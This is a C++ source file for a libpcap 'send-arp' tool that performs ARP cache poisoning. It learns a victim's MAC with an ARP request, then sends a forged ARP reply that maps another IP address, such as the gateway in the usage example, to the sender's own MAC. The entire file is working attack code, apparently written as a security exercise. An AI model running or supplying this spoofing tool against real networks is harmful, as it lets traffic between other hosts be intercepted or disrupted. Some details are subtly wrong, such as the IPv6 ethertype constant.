#include <netinet/ether.h> // for struct ether_header
#include <netinet/in.h>  //for ntohs
#include <stdio.h>  //for pragma pack
#include <pcap.h>
#include <sys/socket.h> // get_mac
#include <sys/ioctl.h>  // get_mac , get_ip
#include <linux/if.h>   // get_mac
#include <netdb.h>      // get_mac
#include <stdio.h>      // get_mac
#include <string.h>     // get_mac

#include <string.h>     // get_ip
#include <arpa/inet.h>  // get_ip , inet_ntop
#include <stdlib.h> // for exit()

/* netinet/ether.h
struct ether_header {   // size: 14byte
    uint8_t ether_dhost[6];
    uint8_t ether_shost[6];
    uint16_t ether_type;
};
*/

#pragma pack(push, 1)
struct arp_header {
    uint16_t hrd_t;
    uint16_t pro_t;
    uint8_t hrd_len;
    uint8_t pro_len;
    uint16_t op;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
};
#pragma pack(pop)

typedef enum {
    ETHER = 1,
    Ip4 = 0x0800,
    Arp = 0x0806,
    Ip6 = 0x06DD,
    Requset = 1,
    Reply   = 2,
}type;

struct  EtherARPpacket {
    ether_header eth_;
    arp_header arp_;
};


void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
    printf("sample : send-arp wlan0 192.168.35.203 192.168.35.1\n");
}

uint8_t* get_mac(char *dev) {
    int i;
    struct ifreq s;
    static uint8_t mymac[6];
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, dev);

    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for (i=0;i<6;i++) {
            mymac[i] = s.ifr_addr.sa_data[i];
        }
    } else {
        printf("!!! getmac error !!!\n");
        exit(1);
    }
    return mymac;
}

uint8_t* get_ip(char * dev) {
    struct ifreq ifr;
    static uint8_t myip[4];
    struct sockaddr_in *sin ; //= (struct sockaddr_in *)&their_addr;
    int n = socket(AF_INET, SOCK_DGRAM, 0);

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    if (0 == ioctl(n, SIOCGIFADDR, &ifr)) {
        sin = reinterpret_cast<struct sockaddr_in *>(&ifr.ifr_addr);
        u_char *ip = (u_char *)&sin -> sin_addr.s_addr;
        memcpy(&myip[0],ip,4);
    }
    else {
        printf("!!! myip error !!!\n");
        exit(1);
    }
    return myip;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char* TargetIP = argv[2];
    char* SenderIP = argv[3];
    char Targetmac[6];
    int i;

    uint8_t *mymac = get_mac(dev);
    uint8_t *myip = get_ip(dev);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    static const int MACsize = 6;
    static const int IPsize = 4;


    EtherARPpacket request_packet;

    for (i=0;i<6;i++) {
        request_packet.eth_.ether_dhost[i] = 0xff;
    }
    memcpy(&request_packet.eth_.ether_shost,mymac,6);
    request_packet.eth_.ether_type = htons(Arp);

    request_packet.arp_.hrd_t = htons(ETHER);
    request_packet.arp_.pro_t = htons(Ip4);
    request_packet.arp_.hrd_len = MACsize;
    request_packet.arp_.pro_len = IPsize;
    request_packet.arp_.op = htons(Requset);
    memcpy(&request_packet.arp_.sender_mac,mymac,6);
    memcpy(&request_packet.arp_.sender_ip, myip,4);
    for (i=0;i<6;i++) {
        request_packet.arp_.target_mac[i] = 0x00;
    }
    inet_pton(AF_INET,TargetIP,&request_packet.arp_.target_ip);

    int res = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&request_packet),sizeof(EtherARPpacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while(1) {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) {
                printf(" pcap_next_ex error \n");
                return -1;
            }

            struct ether_header *ether;
            ether = (struct ether_header*)packet;
            u_short eth_type;
            eth_type = ntohs(ether->ether_type);

            if(eth_type == Arp){
                packet += sizeof(struct ether_header);
                struct arp_header* arp = (struct arp_header*)packet;
                if (ntohs(arp->op) == Reply) {

                    memcpy(&Targetmac,ether->ether_shost,6);


                    EtherARPpacket reply_packet;

                    memcpy(&reply_packet.eth_.ether_dhost,Targetmac,6);
                    memcpy(&reply_packet.eth_.ether_shost,mymac,6);
                    reply_packet.eth_.ether_type = htons(Arp);

                    reply_packet.arp_.hrd_t = htons(ETHER);
                    reply_packet.arp_.pro_t = htons(Ip4);
                    reply_packet.arp_.hrd_len = MACsize;
                    reply_packet.arp_.pro_len = IPsize;
                    reply_packet.arp_.op = htons(Reply);
                    memcpy(&reply_packet.arp_.sender_mac,mymac,6);
                    inet_pton(AF_INET,SenderIP,&reply_packet.arp_.sender_ip);
                    memcpy(&reply_packet.arp_.target_mac,Targetmac,6);
                    inet_pton(AF_INET,TargetIP,&reply_packet.arp_.target_ip);

                    res = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&reply_packet),sizeof(EtherARPpacket));
                    if (res != 0) {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                    }
                    break;
                }
                else {
                    printf("Not Reply...\n");
                }
            }
            else {
                printf("Type is not ARP ...\n");
                return 0;
            }
    }
    pcap_close(handle);
}
